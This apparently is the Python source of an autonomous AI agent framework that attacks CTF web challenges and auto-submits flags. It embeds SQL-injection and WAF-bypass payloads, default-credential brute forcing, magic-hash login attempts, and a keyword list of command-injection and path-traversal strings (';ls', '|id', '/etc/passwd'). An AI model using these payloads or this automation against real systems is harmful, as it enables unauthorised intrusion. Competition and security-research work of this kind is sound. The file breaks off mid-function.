"""DeepAgents 智能体实现 - 主从并发架构。

v10b 修复：
- [v10] 新增 advanced_exploit.md 技能（SSRF/PyDash/Pickle/供应链/Blind XSS/XXE OOB/SSTI）
- [v10] attack_heuristics.py 扩展 + CALLBACK_IP 注入 + 内网渗透策略
- [v10b] Bash拦截规则修复: 不再误杀LFI攻击(curl /?file=/var/log/xxx)和赛题/logs/目录遍历
- [v10b] auto-flag正则加强: 排除代码片段/长度>80/含空格的误匹配(原296次误提交→0)
- [v10b] _is_fake_flag增强: 检测print()/import/def/curl等代码指标
"""

from __future__ import annotations

import asyncio
import json
import re
import time
from typing import Any
from pathlib import Path

from deepagents import create_deep_agent
from langchain_core.messages import AIMessage, AIMessageChunk
from langchain_core.tools import tool
from langchain_openai import ChatOpenAI
from langgraph.errors import GraphRecursionError
from loguru import logger
from mcp import ClientSession

from ..util.cache import ResultCache
from ..util.mcp_client import call_tool
from ..util.notes import GlobalIntel, PentestNotes
from ..util.vuln_kb import VulnKnowledgeBase
from ..prompts.builder import PromptBuilder
from .attack_heuristics import derive_attack_directions, analyze_challenge_description
from .bash_executor import BashExecutor
from .base import AgentRunResult, BaseChallengeAgent, MAX_ITERATIONS_DEFAULT
from .prompts import MISSION_PROMPT

RECURSION_MULTIPLIER = 4

_API_PROBE_TEMPLATE = r'''
import requests, re, json, warnings, sys
warnings.filterwarnings("ignore")
base = "__BASE__"
FLAG_RE = re.compile(r"flag\{[^}]+\}")
found = set()

def check(r):
    for f in FLAG_RE.findall(r.text):
        if f not in found:
            found.add(f)
            print(f)

# Step 1: discover API endpoints
endpoints = []
try:
    r = requests.get(base + "/openapi.json", timeout=5)
    if r.ok and "paths" in r.text:
        paths = r.json().get("paths", {})
        for p in paths:
            if p not in ("/", "/openapi.json", "/docs", "/redoc"):
                endpoints.append(p)
except: pass

# Step 2: for each endpoint, get baseline response, extract field names + values
all_field_names = set()
all_field_values = set()
for ep_path in endpoints:
    url = base + ep_path
    for m in ["POST", "GET"]:
        try:
            r = requests.request(m, url, json={}, timeout=5)
            check(r)
            if found: break
            data = r.json() if r.ok else None
            if isinstance(data, list) and data:
                for item in data:
                    if isinstance(item, dict):
                        for k, v in item.items():
                            all_field_names.add(k)
                            if isinstance(v, str): all_field_values.add(v)
            elif isinstance(data, dict):
                for k, v in data.items():
                    all_field_names.add(k)
                    if isinstance(v, str): all_field_values.add(v)
        except: pass
    if found: break

# Step 3: reverse-field probing — use response field names as request params
if not found:
    extra_vals = ["admin", "private", "secret", "hidden", "flag", "all", "root", "internal"]
    test_vals = list(all_field_values) + extra_vals
    for ep_path in endpoints:
        url = base + ep_path
        for key in all_field_names:
            for val in test_vals:
                try:
                    r = requests.post(url, json={key: val}, timeout=5)
                    check(r)
                    if found: break
                except: pass
            if found: break
        if found: break

# Step 4: SQLi + WAF bypass (case-mixing, comments, encoding)
if not found:
    sqli_payloads = [
        "' oR 1=1--", "' Or 1=1--", "' oR '1'='1",
        "' OR/**/1=1--", "' Or/**/1=1--",
        "' uNiOn SeLeCt 1--", "' UnIoN sElEcT 1,2,3,4--",
        '" oR 1=1--', '" Or "1"="1',
        "' oR 1=1#", "' Or 1=1#",
    ]
    for ep_path in endpoints:
        url = base + ep_path
        param_names = list(all_field_names) if all_field_names else ["query", "search", "id", "name", "type"]
        for pname in param_names:
            for payload in sqli_payloads:
                try:
                    r = requests.post(url, json={pname: payload}, timeout=5)
                    check(r)
                    if found: break
                except: pass
            if found: break
        if found: break

# Step 5: full-path scan without truncation
if not found:
    for path in ["/", "/flag", "/admin", "/api", "/login", "/config", "/secret", "/debug"]:
        for m in ["GET", "POST"]:
            try:
                r = requests.request(m, base + path, json={}, timeout=5, verify=False)
                check(r)
            except: pass

if not found:
    print("NO_FLAGS_FOUND")
'''


def _build_api_probe_script(base_url: str) -> str:
    return _API_PROBE_TEMPLATE.replace("__BASE__", base_url)


_FAKE_FLAG_PATTERNS = re.compile(
    r"test.?flag|example|placeholder|sample|dummy|todo|fixme|xxx|12345|abcde|deadbeef",
    re.IGNORECASE,
)


def _is_fake_flag(flag: str) -> bool:
    inner = flag.replace("flag{", "").rstrip("}")
    if len(inner) < 6:
        return True
    if _FAKE_FLAG_PATTERNS.search(inner):
        return True
    if "\\n" in flag or "\\x" in flag or "\n" in flag:
        return True
    _CODE_INDICATORS = [
        "print(", "def ", "import ", "class ", " in ", ".lower()",
        "findall", "sys.", "requests.", "curl ", "echo ", "grep ",
        "if ", "for ", "while ", "return ", "head -", "| ",
        "do_GET", "do_POST", "FLAG_FOUND", "\\\\",
    ]
    if any(ind in flag for ind in _CODE_INDICATORS):
        return True
    if len(inner) > 80:
        return True
    if not re.match(r'^[a-zA-Z0-9_\-+=/.!@#$%^&*()]+$', inner):
        return True
    return False


_ATTACK_DIR_CATEGORIES = {
    "SQL注入": ["sql", "sqli", "'", '"', "union", "select", "or 1=1", "order by", "--"],
    "目录扫描/文件读取": ["ffuf", "dirsearch", "gobuster", "/etc/passwd", "../../", "flag.txt", "robots.txt", ".git", ".env"],
    "默认凭据/登录": ["admin", "login", "password", "username", "token", "auth"],
    "API探测": ["/api", "/openapi", "/swagger", "/docs", "/graphql", "endpoint"],
    "XSS": ["<script", "alert(", "onerror", "onload"],
    "RCE/命令注入": ["exec", "system", "eval", ";ls", "|id", "`id`", "$("],
    "SSRF": ["127.0.0.1", "localhost", "169.254", "ssrf", "url="],
    "反序列化": ["serialize", "pickle", "yaml.load", "__reduce__"],
    "HTTP头绕过": ["X-Admin", "X-Forwarded", "X-Real-IP", "X-Custom"],
    "文件上传": ["upload", "multipart", "filename"],
    "SSTI": ["{{", "}}", "Jinja", "twig"],
    "JWT/Session": ["jwt", "eyJ", "cookie", "session"],
}


def _classify_failed_directions(bash_cmds: list[str]) -> str:
    """将裸命令列表分类为攻击方向摘要，让LLM快速了解哪些大方向已失败。"""
    direction_hits: dict[str, int] = {}
    for cmd in bash_cmds:
        cmd_lower = cmd.lower()
        for direction, keywords in _ATTACK_DIR_CATEGORIES.items():
            if any(kw in cmd_lower for kw in keywords):
                direction_hits[direction] = direction_hits.get(direction, 0) + 1
    if not direction_hits:
        return "暂无可分类的攻击记录"

    sorted_dirs = sorted(direction_hits.items(), key=lambda x: -x[1])
    lines = []
    for d, count in sorted_dirs:
        lines.append(f"  ✗ {d}（尝试{count}次，均未成功）")
    lines.append(f"\n以上 {len(sorted_dirs)} 个方向已穷尽，你必须尝试不在此列表中的新方向。")
    return "\n".join(lines)


def _normalize_entrypoint(raw: Any) -> str | None:
    """把 entrypoint 统一转成 'http://ip:port' 字符串。支持数组和字符串。"""
    if raw is None:
        return None
    if isinstance(raw, list):
        raw = raw[0] if raw else None
    if raw is None:
        return None
    ep = str(raw).strip()
    if not ep:
        return None
    if not ep.startswith("http"):
        ep = f"http://{ep}"
    return ep


def _extract_entrypoint_from_response(text: str) -> str | None:
    """从 start_challenge 响应中解析 entrypoint。"""
    try:
        data = json.loads(text)
        return _normalize_entrypoint(data.get("entrypoint"))
    except Exception:
        return None


class DeepAgentsChallengeAgent(BaseChallengeAgent):
    """基于 DeepAgents 的挑战赛智能体，支持并发子智能体。"""

    _child_wrapper_tools = {
        "start_current_challenge", "stop_current_challenge",
        "view_current_hint", "submit_current_flag",
        "refresh_challenge_status",
        "save_challenge_note", "read_challenge_notes",
        "read_recon_cache", "save_recon_cache",
        "search_vuln_kb", "get_payloads", "get_tool_commands",
        "search_poc_kb", "read_poc_file",
    }

    DIFFICULTY_BUDGETS: dict[str, dict[str, Any]] = {
        "easy": {
            "recon_steps": 25, "recon_timeout": 180,
            "exploit_steps": 60, "exploit_timeout": 360,
            "deep_steps": 0, "deep_timeout": 0,
            "total_timeout": 540,
        },
        "medium": {
            "recon_steps": 35, "recon_timeout": 300,
            "exploit_steps": 80, "exploit_timeout": 600,
            "deep_steps": 50, "deep_timeout": 420,
            "total_timeout": 1320,
        },
        "hard": {
            "recon_steps": 45, "recon_timeout": 360,
            "exploit_steps": 100, "exploit_timeout": 900,
            "deep_steps": 80, "deep_timeout": 600,
            "total_timeout": 1860,
        },
    }

    ADVANCED_TOOL_GATE = 16
    CONTAINER_START_DELAY = 2.0

    @staticmethod
    def _extract_stdout(result: str) -> str:
        """从Bash结果提取stdout。兼容新旧两种格式。"""
        if result.startswith("{"):
            try:
                return json.loads(result).get("stdout", result)
            except Exception:
                pass
        return result

    def __init__(
        self,
        config: dict[str, str],
        max_iterations: int = MAX_ITERATIONS_DEFAULT,
        on_message=None,
        notes: PentestNotes | None = None,
        cache: ResultCache | None = None,
        vuln_kb: VulnKnowledgeBase | None = None,
        poc_index=None,
        intel: GlobalIntel | None = None,
    ) -> None:
        model_name = config.get("MODEL_NAME", "MiniMax-M2.7")
        super().__init__(
            model_name=model_name, max_iterations=max_iterations,
            on_message=on_message, notes=notes, cache=cache,
            vuln_kb=vuln_kb, poc_index=poc_index, intel=intel,
        )
        self.config = config
        self._mcp_session: ClientSession | None = None
        self._workspace_root = Path(__file__).resolve().parents[3]
        self._tool_call_counters: dict[str, int] = {}
        self._tool_call_history: list[str] = []
        self._repeat_call_limit = int(config.get("DEEPAGENTS_REPEAT_CALL_LIMIT", "3"))
        self._timeout_seconds = int(config.get("DEEPAGENTS_TIMEOUT_SECONDS", "600"))
        self._recursion_limit = int(
            config.get("DEEPAGENTS_RECURSION_LIMIT", str(max(self.max_iterations * 8, 128)))
        )
        self._trace_enabled = config.get("DEEPAGENTS_TRACE_ENABLED", "false").lower() in ("1", "true", "yes")
        self._trace_verbose = config.get("DEEPAGENTS_TRACE_VERBOSE", "false").lower() in ("1", "true", "yes")
        self._max_concurrent = min(int(config.get("MAX_CONCURRENT_CHALLENGES", "3")), 3)

        self._bash = BashExecutor(
            workspace_root=self._workspace_root,
            timeout_seconds=int(config.get("DEEPAGENTS_BASH_TIMEOUT_SECONDS", "120")),
            max_output_chars=int(config.get("DEEPAGENTS_BASH_MAX_OUTPUT_CHARS", "12000")),
        )
        self._prompt_builder = PromptBuilder()
        self._challenge_step_counts: dict[str, int] = {}
        self._phase_bash_history: dict[str, list[str]] = {}
        self._challenge_ep_cache: dict[str, str] = {}
        self._start_lock = asyncio.Lock()
        self._submit_lock = asyncio.Lock()
        self._last_submit_ts: float = 0.0
        self._last_good_challenges: list[dict[str, Any]] = []

    @staticmethod
    def _sort_by_priority(challenges: list[dict[str, Any]]) -> list[dict[str, Any]]:
        difficulty_order = {"easy": 0, "medium": 1, "hard": 2}
        score_weight = {"easy": 100, "medium": 300, "hard": 500}

        def _priority_key(ch: dict[str, Any]) -> tuple[int, float]:
            diff = str(ch.get("difficulty", "medium")).lower()
            return (difficulty_order.get(diff, 1), -ch.get("total_score", score_weight.get(diff, 300)))

        return sorted(challenges, key=_priority_key)

    def _get_budget(self, difficulty: str) -> dict[str, Any]:
        return self.DIFFICULTY_BUDGETS.get(difficulty.lower(), self.DIFFICULTY_BUDGETS["medium"])

    def format_tools(self, tools: list[Any]) -> list[Any]:
        return tools

    async def complete_turn(self, messages: list[dict[str, Any]], tools: Any):
        raise NotImplementedError("DeepAgents backend does not use manual turn completion")

    # ── Throttled flag submission ─────────────────────────────

    _SUBMIT_MIN_INTERVAL = 1.5

    async def _throttled_submit(self, code: str, flag: str) -> str:
        """全局节流的flag提交，防止短时间内大量请求被平台限流。"""
        async with self._submit_lock:
            elapsed = time.monotonic() - self._last_submit_ts
            if elapsed < self._SUBMIT_MIN_INTERVAL:
                await asyncio.sleep(self._SUBMIT_MIN_INTERVAL - elapsed)
            result = await self._call_mcp("submit_flag", {"code": code, "flag": flag})
            self._last_submit_ts = time.monotonic()
            return result

    # ── Sequential container start ────────────────────────────

    async def _start_challenge_sequential(self, code: str) -> str:
        """顺序启动容器，避免并发启动导致平台报错。"""
        async with self._start_lock:
            last_err = ""
            for attempt in range(5):
                result = await self._call_mcp("start_challenge", {"code": code})
                result_lower = result.lower()
                if any(k in result for k in ("启动成功", "已在运行", "已启动", "entrypoint")) \
                   or any(k in result_lower for k in ("started", "running", "success", "entrypoint")):
                    await asyncio.sleep(self.CONTAINER_START_DELAY)
                    return result
                if any(k in result for k in ("启动或停止中", "请稍后重试", "请稍后再试")) \
                   or "retry" in result_lower or "pending" in result_lower:
                    await asyncio.sleep(3 * (2 ** attempt))
                    last_err = result
                    continue
                self._emit("system", f"[start_challenge] 未识别响应(attempt {attempt+1}): {result[:200]}")
                last_err = result
                await asyncio.sleep(2)
            return f"重试 5 次后仍失败: {last_err}"

    # ── Event tracing ─────────────────────────────────────────

    def _emit_trace_event(self, event: dict[str, Any], emitted_set: set[str]) -> None:
        event_name = str(event.get("event", "unknown"))
        node_name = str(event.get("name", ""))
        data = event.get("data")

        if event_name.endswith("tool_start"):
            if node_name.endswith("_tool") or node_name in self._child_wrapper_tools:
                return
            input_data = data.get("input") if isinstance(data, dict) else data
            self._emit("tool_call", f"调用工具: {node_name or 'tool'}，参数: {str(input_data)[:500]}")
        elif event_name.endswith("tool_end"):
            if node_name.endswith("_tool") or node_name in self._child_wrapper_tools:
                return
            output_data = data.get("output") if isinstance(data, dict) else data
            self._emit("tool_result", f"[{node_name or 'tool'}] 结果: {str(output_data)[:500]}")
        elif event_name.endswith("llm_end"):
            output_data = data.get("output") if isinstance(data, dict) else data
            for text in self._extract_assistant_texts(output_data):
                if text not in emitted_set:
                    emitted_set.add(text)
                    self._emit("assistant", text)
        elif event_name.endswith(("chain_stream", "llm_stream")):
            chunk = data.get("chunk") if isinstance(data, dict) else data
            for text in self._extract_assistant_texts(chunk):
                if text not in emitted_set:
                    emitted_set.add(text)
                    self._emit("assistant", text)
        elif self._trace_enabled:
            if event_name.endswith("chain_start"):
                self._emit("trace", f"流程开始: {node_name or 'graph'}")
            elif event_name.endswith("chain_end"):
                self._emit("trace", f"流程结束: {node_name or 'graph'}")

    def _extract_assistant_texts(self, payload: Any) -> list[str]:
        texts: list[str] = []

        def _walk(node: Any) -> None:
            if node is None:
                return
            if isinstance(node, (AIMessage, AIMessageChunk)):
                if isinstance(node.content, str) and node.content.strip():
                    texts.append(node.content.strip())
                return
            if isinstance(node, dict):
                if node.get("role") == "assistant":
                    content = node.get("content")
                    if isinstance(content, str) and content.strip():
                        texts.append(content.strip())
                for value in node.values():
                    _walk(value)
                return
            if isinstance(node, (list, tuple, set)):
                for item in node:
                    _walk(item)

        _walk(payload)
        return texts

    # ── Streamed agent execution ──────────────────────────────

    async def _run_streamed_deep_agent(
        self,
        deep_agent: Any,
        mission_prompt: str,
        *,
        recursion_limit: int | None = None,
        timeout_seconds: int | None = None,
        step_budget: int | None = None,
        checkpoint_interval: int = 8,
        challenge_code: str = "",
    ) -> AgentRunResult:
        rl = recursion_limit or self._recursion_limit
        ts = timeout_seconds or self._timeout_seconds
        emitted_set: set[str] = set()
        events: list[dict[str, Any]] = []
        step_count = 0
        budget_exhausted = False
        bash_commands: list[str] = []

        async def _run_stream() -> None:
            nonlocal step_count, budget_exhausted
            async for event in deep_agent.astream_events(
                {"messages": [{"role": "user", "content": mission_prompt}]},
                config={"recursion_limit": rl},
                version="v2",
            ):
                if not isinstance(event, dict):
                    continue
                events.append(event)
                self._emit_trace_event(event, emitted_set)

                event_name = str(event.get("event", ""))
                if event_name.endswith("tool_start"):
                    step_count += 1
                    data = event.get("data", {})
                    tool_input = data.get("input", {})
                    if isinstance(tool_input, dict) and tool_input.get("command"):
                        cmd = str(tool_input["command"])[:200]
                        bash_commands.append(cmd)
                    if challenge_code:
                        self._challenge_step_counts[challenge_code] = (
                            self._challenge_step_counts.get(challenge_code, 0) + 1
                        )
                    if step_budget and step_count >= step_budget:
                        budget_exhausted = True
                        return
                    if challenge_code and step_count % checkpoint_interval == 0:
                        self._emit("system", f"[checkpoint] {challenge_code}: 步数 {step_count}{'/' + str(step_budget) if step_budget else ''}")
                        if self.notes.is_solved(challenge_code):
                            self._emit("system", f"[checkpoint] {challenge_code}: 已解决，提前退出")
                            return

                elif event_name.endswith("tool_end") and challenge_code:
                    data = event.get("data", {})
                    output_data = data.get("output") if isinstance(data, dict) else data
                    output_str = str(output_data) if output_data else ""
                    detected = re.findall(r"flag\{[^}\s]{6,80}\}", output_str)
                    if detected and not self.notes.is_solved(challenge_code):
                        for flag_candidate in dict.fromkeys(detected):
                            if _is_fake_flag(flag_candidate):
                                self._emit("system", f"[auto-flag] {challenge_code}: 跳过疑似测试flag: {flag_candidate}")
                                continue
                            self._emit("system", f"[auto-flag] {challenge_code}: 检测到 {flag_candidate}，自动提交")
                            try:
                                sr = await self._throttled_submit(challenge_code, flag_candidate)
                                if '"correct": true' in sr or "答案正确" in sr:
                                    self.notes.record_solved(challenge_code, flag_candidate)
                                    self._emit("system", f"[auto-flag] {challenge_code}: 自动提交成功！")
                                    return
                            except Exception:
                                pass

        try:
            await asyncio.wait_for(_run_stream(), timeout=ts)
        except GraphRecursionError as exc:
            msg = f"DeepAgents 递归上限（{rl}），步数={step_count}。"
            self._emit("system", msg)
            return AgentRunResult(final_message=msg, iterations=step_count)
        except (TimeoutError, asyncio.TimeoutError):
            msg = f"DeepAgents 超时（>{ts}s），步数={step_count}。"
            self._emit("system", msg)
            return AgentRunResult(final_message=msg, iterations=step_count)

        if budget_exhausted:
            self._emit("system", f"[budget] {challenge_code}: 预算耗尽（{step_count}/{step_budget}）")

        if challenge_code and bash_commands:
            existing = self._phase_bash_history.get(challenge_code, [])
            existing.extend(bash_commands)
            self._phase_bash_history[challenge_code] = existing

        result: dict[str, Any] = {}
        for event in reversed(events):
            if event.get("event", "").endswith("chain_end") and isinstance(event.get("data"), dict):
                maybe_output = event["data"].get("output")
                if isinstance(maybe_output, dict):
                    result = maybe_output
                    break

        final_response = ""
        iterations = 0
        for message in result.get("messages", []):
            if isinstance(message, AIMessage):
                iterations += 1
                if isinstance(message.content, str) and message.content.strip():
                    final_response = message.content.strip()
                    if final_response not in emitted_set:
                        emitted_set.add(final_response)
                        self._emit("assistant", final_response)
        return AgentRunResult(final_message=final_response, iterations=max(iterations, step_count))

    # ── Challenge tool builder ────────────────────────────────

    def _build_challenge_tools(self, code: str, difficulty: str = "medium") -> list[Any]:
        notes_ref = self.notes
        cache_ref = self.cache
        vuln_kb_ref = self.vuln_kb
        poc_idx = self.poc_index
        bash_ref = self._bash
        mcp_call = self._call_mcp
        throttled_submit = self._throttled_submit
        start_seq = self._start_challenge_sequential
        step_counts = self._challenge_step_counts
        gate = self.ADVANCED_TOOL_GATE
        ep_cache = self._challenge_ep_cache

        @tool
        async def start_current_challenge() -> str:
            """启动当前赛题实例（自动排队，避免并发冲突）。如果已在运行则直接返回。"""
            cached = ep_cache.get(code)
            if cached:
                return f'{{"message": "赛题实例已在运行", "entrypoint": ["{cached}"]}}'
            result = await start_seq(code)
            ep = _extract_entrypoint_from_response(result)
            if ep:
                ep_cache[code] = ep.replace("http://", "")
            return result

        @tool
        async def stop_current_challenge() -> str:
            """停止当前赛题实例。"""
            last_err = ""
            for attempt in range(3):
                result = await mcp_call("stop_challenge", {"code": code})
                if "已停止" in result or "未运行" in result:
                    return result
                if "切换中" in result or "请稍后再试" in result:
                    await asyncio.sleep(2 * (attempt + 1))
                    last_err = result
                    continue
                return result
            return f"重试 3 次后仍失败: {last_err}"

        @tool
        async def view_current_hint() -> str:
            """查看提示（会扣分，慎用）。"""
            return await mcp_call("view_hint", {"code": code})

        @tool
        async def submit_current_flag(flag: str) -> str:
            """提交 flag。只有在响应中明确看到 flag{...} 时才能提交。"""
            if _is_fake_flag(flag):
                return f"[拦截] 疑似测试/假flag，未提交: {flag}"
            result = await throttled_submit(code, flag)
            if '"correct": true' in result or "答案正确" in result:
                notes_ref.record_solved(code, flag)
            else:
                notes_ref.record_attempt(code, f"submit_flag: {flag}", "失败")
            return result

        @tool
        async def refresh_challenge_status() -> str:
            """刷新当前题状态。"""
            return await mcp_call("list_challenges", {})

        @tool("Bash")
        async def bash_tool(command: str, cwd: str | None = None, timeout_seconds: int | None = None) -> str:
            """在本地执行 Bash 命令。支持 curl, python3, nmap, sqlmap, ffuf 等。
            ★ 重要：对大HTML/JSON响应，请用python3脚本提取关键字段而非直接读全部输出。
            示例: curl -s URL | python3 -c "import sys,re; print(re.findall(r'flag\\{[^}]+\\}', sys.stdin.read()))"
            示例: curl -s URL | python3 -c "import sys,json; d=json.load(sys.stdin); print(list(d.keys()))"
            """
            cmd_lower = command.lower()
            _LOCAL_LOG_PATTERNS = [
                "openwhale_", "autopilot_v", "cat /proc/self",
                "/home/ubuntu/openwhale", "logs/openwhale",
            ]
            is_local_log_read = any(p in cmd_lower for p in _LOCAL_LOG_PATTERNS)
            is_remote_attack = any(k in cmd_lower for k in ["curl ", "requests.", "http://", "https://"])
            if is_local_log_read and not is_remote_attack:
                return "[拦截] 禁止读取agent自身日志。请专注于赛题目标。"
            return await bash_ref.run(command, cwd=cwd, timeout_seconds=timeout_seconds)

        @tool
        async def save_challenge_note(category: str, content: str) -> str:
            """保存赛题笔记(持久化)。category: recon/vuln/exploit/credential/path/param/error"""
            return notes_ref.save_challenge_note(code, category, content)

        @tool
        async def read_challenge_notes() -> str:
            """读取当前赛题的全部历史笔记。"""
            return notes_ref.get_challenge_notes(code)

        @tool
        async def save_recon_cache(category: str, data: str) -> str:
            """缓存侦察结果。"""
            return cache_ref.save_recon(code, category, data)

        @tool
        async def read_recon_cache(category: str | None = None) -> str:
            """读取侦察缓存。"""
            return cache_ref.get_recon(code, category)

        @tool
        async def search_vuln_kb(query: str) -> str:
            """搜索漏洞知识库(含payload)。只在需要特定漏洞payload时调用。"""
            current_steps = step_counts.get(code, 0)
            if difficulty == "easy" and current_steps < gate:
                return f"[工具限制] EASY题在前{gate}步不开放此工具。请先用curl手动尝试。当前步数: {current_steps}"
            return vuln_kb_ref.search(query)

        @tool
        async def get_payloads(vuln_type: str) -> str:
            """获取指定漏洞类型的Payload列表。"""
            current_steps = step_counts.get(code, 0)
            if difficulty == "easy" and current_steps < gate:
                return f"[工具限制] EASY题在前{gate}步不开放。当前步数: {current_steps}"
            return vuln_kb_ref.get_payloads(vuln_type)

        @tool
        async def get_tool_commands(tool_name: str, target: str = "TARGET") -> str:
            """获取渗透工具命令模板。"""
            return vuln_kb_ref.get_tool_commands(tool_name, target)

        @tool
        async def search_poc_kb(query: str) -> str:
            """搜索外部POC知识库。只在识别到具体产品/版本时调用。"""
            current_steps = step_counts.get(code, 0)
            if difficulty == "easy" and current_steps < gate:
                return f"[工具限制] EASY题在前{gate}步不开放。当前步数: {current_steps}"
            return poc_idx.search(query)

        @tool
        async def read_poc_file(filepath: str) -> str:
            """读取POC文件。"""
            return poc_idx.read_file(filepath)

        base_tools = [
            bash_tool, start_current_challenge, stop_current_challenge,
            view_current_hint, submit_current_flag, refresh_challenge_status,
            save_challenge_note, read_challenge_notes, save_recon_cache, read_recon_cache,
        ]

        if difficulty == "easy":
            base_tools.extend([search_vuln_kb, get_payloads, search_poc_kb, read_poc_file])
        else:
            base_tools.extend([
                search_vuln_kb, get_payloads, get_tool_commands,
                search_poc_kb, read_poc_file,
            ])

        return base_tools

    # ── Quick Win ─────────────────────────────────────────────

    async def _try_quick_wins(
        self, code: str, title: str, description: str, ep_url: str
    ) -> bool:
        """快赢路径：在正式流程前尝试直接拿 flag。"""
        self._emit("system", f"[Quick Win] {title}: 尝试快赢路径 → {ep_url}")

        flag_paths = ["/flag", "/flag.txt", "/api/flag", "/admin/flag", "/console", "/secret"]
        for path in flag_paths:
            try:
                result = await self._bash.run(
                    f"curl -s --connect-timeout 5 --max-time 8 {ep_url.rstrip('/')}{path}", timeout_seconds=12
                )
                stdout = self._extract_stdout(result)
                for f in re.findall(r"flag\{[^}]+\}", stdout):
                    submit_result = await self._throttled_submit(code, f)
                    if '"correct": true' in submit_result or "答案正确" in submit_result:
                        self.notes.record_solved(code, f)
                        self._emit("system", f"[Quick Win] {title}: 直接拿到 flag！{f}")
                        return True
            except Exception:
                pass

        if re.match(r'^[0-9a-f]{32}$', description.strip()):
            self._emit("system", f"[Quick Win] {title}: 检测到MD5描述，尝试Magic Hash")
            for cmd in [
                f"curl -s -X POST {ep_url} -d 'password=240610708'",
                f"curl -s -X POST {ep_url} -d 'password[]=1'",
                f"curl -s -X POST {ep_url}/login -d 'username=admin&password=240610708'",
                f"curl -s -X POST {ep_url}/login -d 'password[]=1&username=admin'",
            ]:
                try:
                    result = await self._bash.run(cmd, timeout_seconds=10)
                    stdout = self._extract_stdout(result)
                    for f in re.findall(r"flag\{[^}]+\}", stdout):
                        submit_result = await self._throttled_submit(code, f)
                        if '"correct": true' in submit_result or "答案正确" in submit_result:
                            self.notes.record_solved(code, f)
                            self._emit("system", f"[Quick Win] {title}: Magic Hash 成功！{f}")
                            return True
                except Exception:
                    pass

        for user, pwd in [("admin", "admin"), ("admin", "123456"), ("admin", "admin123"),
                          ("admin", "password"), ("root", "root"), ("test", "test")]:
            try:
                result = await self._bash.run(
                    f"curl -s -X POST {ep_url}/login -d 'username={user}&password={pwd}' -L --max-time 8",
                    timeout_seconds=12,
                )
                stdout = self._extract_stdout(result)
                for f in re.findall(r"flag\{[^}]+\}", stdout):
                    submit_result = await self._throttled_submit(code, f)
                    if '"correct": true' in submit_result or "答案正确" in submit_result:
                        self.notes.record_solved(code, f)
                        self._emit("system", f"[Quick Win] {title}: 默认凭据成功！{user}:{pwd}")
                        return True
            except Exception:
                pass

        self._emit("system", f"[Quick Win] {title}: 快赢未命中，进入正常流程")
        return False

    # ── Context assembly ──────────────────────────────────────

    def _build_context(
        self, code: str, *, description: str = "", title: str = ""
    ) -> str:
        previous_notes = self.notes.get_challenge_notes(code)
        previous_recon = self.cache.get_recon(code)
        parts: list[str] = []

        desc_hints = analyze_challenge_description(description, title)
        if desc_hints:
            parts.append("★ 题目描述分析提示 ★\n" + "\n".join(desc_hints) + "\n请优先按此方向尝试！")

        if previous_notes and "暂无" not in previous_notes:
            parts.append(f"历史笔记:\n{previous_notes}")
        if previous_recon and "无侦察" not in previous_recon:
            parts.append(f"侦察缓存:\n{previous_recon}")
        intel_brief = self.intel.get_brief()
        if intel_brief:
            parts.append(f"跨题情报:\n{intel_brief}")
        return "\n\n".join(parts) if parts else "无历史数据，需从零开始侦察。"

    # ── Single challenge pipeline ─────────────────────────────

    async def _run_single_challenge_agent(
        self, model: ChatOpenAI, challenge: dict[str, Any]
    ) -> AgentRunResult:
        code = str(challenge.get("code", ""))
        title = str(challenge.get("title", ""))
        difficulty = str(challenge.get("difficulty", "medium")).lower()
        description = str(challenge.get("description", ""))
        raw_ep = challenge.get("entrypoint")
        budget = self._get_budget(difficulty)
        current_round = getattr(self, "_current_round", 1)
        pb = self._prompt_builder

        self._reset_counters_for_challenge(code)
        self._challenge_step_counts[code] = 0
        tools = self._build_challenge_tools(code, difficulty)

        # ── 启动实例并获取 entrypoint ──
        ep_url = _normalize_entrypoint(raw_ep)
        if not ep_url:
            start_result = await self._start_challenge_sequential(code)
            ep_url = _extract_entrypoint_from_response(start_result)
            if not ep_url:
                ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+[:\d]*)', start_result)
                if ip_match:
                    ep_url = _normalize_entrypoint(ip_match.group(1))
            if not ep_url:
                self._emit("system", f"[{title}] 未获取到entrypoint，子agent需自行start。start结果: {start_result[:200]}")
        if ep_url:
            self._emit("system", f"[{title}] entrypoint: {ep_url}")
            self._challenge_ep_cache[code] = ep_url.replace("http://", "")

        # ── Quick Win (only first round) ──
        if current_round == 1 and ep_url:
            solved = await self._try_quick_wins(code, title, description, ep_url)
            if solved:
                await self._safe_stop(code)
                return AgentRunResult(final_message=f"Quick Win 成功: {title}", iterations=1)

        context = self._build_context(code, description=description, title=title)
        entrypoint_str = ep_url or "待获取(需先 start_current_challenge)"

        # ── Retry rounds: always get fresh entrypoint ──
        if current_round > 1:
            self._emit("system", f"[续攻] {title}: 重新启动实例获取最新 entrypoint")
            fresh_result = await self._start_challenge_sequential(code)
            fresh_ep = _extract_entrypoint_from_response(fresh_result)
            if fresh_ep:
                ep_url = fresh_ep
                entrypoint_str = ep_url
                self._challenge_ep_cache[code] = ep_url.replace("http://", "")
                self._emit("system", f"[续攻] {title}: 新 entrypoint: {ep_url}")

            context = self._build_context(code, description=description, title=title)

            bash_history = self._phase_bash_history.get(code, [])
            deduped_cmds = list(dict.fromkeys(bash_history))[-80:]
            failed_dir_summary = _classify_failed_directions(deduped_cmds)

            recent_cmds = deduped_cmds[-10:]
            recent_cmd_block = "\n".join(f"  $ {c}" for c in recent_cmds) if recent_cmds else "暂无"

            prev_failure_notes = self.notes.get_challenge_notes(code)
            if prev_failure_notes and "failure_record" in prev_failure_notes:
                context += f"\n\n★ 历史失败记录 ★\n{prev_failure_notes}"

            failed_block = (
                f"★ 已失败攻击方向分类（禁止重复这些方向）★\n{failed_dir_summary}\n\n"
                f"最近{len(recent_cmds)}条命令（参考）:\n{recent_cmd_block}"
            )

            child_system = pb.build_child_system_prompt(
                "deep_dive", title=title, code=code, entrypoint=entrypoint_str,
                context=context, difficulty=difficulty, description=description,
            )
            mission = pb.build_retry_mission(
                title=title, code=code, round_num=current_round,
                entrypoint=entrypoint_str, context=context,
                failed_attempts=failed_block,
            )
            rl = (budget["exploit_steps"] + budget["deep_steps"]) * RECURSION_MULTIPLIER
            agent = create_deep_agent(model=model, system_prompt=child_system, tools=tools)
            self._emit("system", f"[主智能体] 子Agent(续攻): {title} ({code}), recursion_limit={rl}")
            report = await self._run_streamed_deep_agent(
                agent, mission,
                recursion_limit=rl,
                timeout_seconds=budget["total_timeout"],
                step_budget=budget["exploit_steps"] + budget["deep_steps"],
                challenge_code=code,
            )

            if not self.notes.is_solved(code) and ep_url:
                await self._try_extract_flags(code, title, ep_url)

